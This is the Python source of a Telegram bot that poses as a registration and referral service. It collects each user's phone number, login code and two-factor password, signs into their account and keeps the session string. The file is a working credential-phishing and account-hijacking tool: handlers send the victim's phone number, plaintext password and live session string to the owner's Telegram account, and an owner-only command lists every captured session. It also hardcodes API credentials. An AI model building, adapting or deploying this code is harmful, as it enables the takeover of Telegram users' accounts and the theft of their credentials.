import re
import asyncio
import motor.motor_asyncio
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError
from telethon.sessions import StringSession
from flask import Flask
import threading

# =================== CONFIG =================== #
API_ID = 29657994
API_HASH = "85f461c4f637911d79c65da1fc2bdd77"
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
OWNER_USERNAME = "Rishu1286"
MONGO_URL = "mongodb://localhost:27017"  # Update if using remote DB

# =================== DB SETUP =================== #
mongo_client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URL)
db = mongo_client.cc_killer
users_collection = db.users

# =================== PYROGRAM BOT =================== #
app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# =================== FLASK APP (PORT 8080) =================== #
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    flask_app.run(host="0.0.0.0", port=8080)

threading.Thread(target=run_flask).start()

# =================== TEMP USER DATA =================== #
temp_user_data = {}

# =================== START CMD =================== #
@app.on_message(filters.command("start"))
async def start(client, message: Message):
    ref_by = None
    if len(message.command) > 1:
        ref_by = message.command[1]

    user_id = message.from_user.id
    user = await users_collection.find_one({"user_id": user_id})

    if not user:
        data = {
            "user_id": user_id,
            "username": message.from_user.username,
            "ref_by": int(ref_by) if ref_by and ref_by.isdigit() else None,
            "session": None,
            "phone": None,
            "password": None
        }
        await users_collection.insert_one(data)

        if data["ref_by"]:
            await users_collection.update_one({"user_id": data["ref_by"]}, {"$inc": {"referrals": 1}})
            await app.send_message(f"@{OWNER_USERNAME}", f"New referral joined from user ID: {data['ref_by']}")

    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("Register", callback_data="register")],
        [InlineKeyboardButton("Referral Link", url=f"https://t.me/{(await app.get_me()).username}?start={user_id}")]
    ])

    await message.reply(
        f"Welcome {message.from_user.mention}!\n\n"
        "Use the button below to register or get your referral link.",
        reply_markup=reply_markup
    )

# =================== REGISTER (INLINE & COMMAND) =================== #
@app.on_message(filters.command("register"))
async def manual_register(client, message: Message):
    await ask_contact(message)

@app.on_callback_query(filters.regex("register"))
async def inline_register(client, callback_query):
    await ask_contact(callback_query.message)
    await callback_query.answer()

async def ask_contact(msg):
    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await msg.reply("Please share your phone number to start login.", reply_markup=reply_markup)

# =================== CONTACT HANDLER =================== #
@app.on_message(filters.contact)
async def handle_contact(client, message: Message):
    phone_number = message.contact.phone_number
    user_id = message.from_user.id

    tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
    await tele_client.connect()

    try:
        result = await tele_client.send_code_request(phone_number)
        temp_user_data[user_id] = {
            "client": tele_client,
            "phone": phone_number,
            "hash": result.phone_code_hash
        }
        await message.reply("OTP sent. Please send the code here.")
    except Exception as e:
        await message.reply(f"Failed to send OTP: {e}")
        await tele_client.disconnect()

# =================== OTP / PASSWORD HANDLER =================== #
@app.on_message(filters.private & filters.text)
async def handle_otp_password(client, message: Message):
    user_id = message.from_user.id
    if user_id not in temp_user_data:
        return

    user_state = temp_user_data[user_id]
    tele_client = user_state["client"]

    try:
        if user_state.get("awaiting_password"):
            password = message.text.strip()
            await tele_client.sign_in(password=password)
            session_string = tele_client.session.save()

            await users_collection.update_one(
                {"user_id": user_id},
                {"$set": {"session": session_string, "password": password, "phone": user_state["phone"]}}
            )
            await app.send_message(f"@{OWNER_USERNAME}", f"2FA Login:\n**Number:** {user_state['phone']}\n**Password:** `{password}`\n**Session:** `{session_string}`")

            await message.reply("Login successful with 2FA!")
            await tele_client.disconnect()
            temp_user_data.pop(user_id)
        else:
            otp = message.text.strip()
            await tele_client.sign_in(user_state["phone"], otp, phone_code_hash=user_state["hash"])
            session_string = tele_client.session.save()

            await users_collection.update_one(
                {"user_id": user_id},
                {"$set": {"session": session_string, "phone": user_state["phone"], "password": None}}
            )
            await app.send_message(f"@{OWNER_USERNAME}", f"Login Successful:\n**Number:** {user_state['phone']}\n**Session:** `{session_string}`")
            await message.reply("Login successful!")
            await tele_client.disconnect()
            temp_user_data.pop(user_id)

    except SessionPasswordNeededError:
        user_state["awaiting_password"] = True
        await message.reply("2FA is enabled. Please send your password.")
    except PhoneCodeInvalidError:
        await message.reply("Invalid OTP. Try again.")
    except Exception as e:
        await message.reply(f"Login failed: {e}")
        await tele_client.disconnect()
        temp_user_data.pop(user_id)

# =================== OWNER COMMAND TO VIEW LOGGED USERS =================== #
@app.on_message(filters.command("rishu") & filters.private)
async def view_sessions(client, message: Message):
    if message.from_user.username != OWNER_USERNAME:
        return

    users = users_collection.find({"session": {"$ne": None}})
    text = "**Logged-in Users:**\n\n"
    async for u in users:
        text += f"ID: `{u['user_id']}`\nPhone: `{u.get('phone', 'N/A')}`\nSession: `{u.get('session', 'N/A')}`\n\n"
    await message.reply(text or "No users logged in.")

# =================== RUN =================== #
if __name__ == "__main__":
    app.run()
